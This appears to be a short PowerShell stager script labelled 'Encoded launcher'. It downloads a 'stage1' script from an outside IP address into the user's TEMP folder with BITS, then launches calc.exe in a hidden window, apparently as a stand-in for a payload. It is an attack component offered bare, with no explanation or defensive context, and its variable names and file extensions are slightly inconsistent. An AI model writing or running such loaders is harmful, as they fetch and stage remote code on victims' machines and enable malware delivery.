
# Encoded launcher
$Stage2Url = 'https://192.0.2.155/stage1.ps1'
$OutputPath = "$env:TEMP\stage1.bin"
$TransferTimeout = 96
Start-BitsTransfer -Source $Stage2Url -Destination $OutputPath
Start-Process -FilePath "calc.exe" -WindowStyle Hidden
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
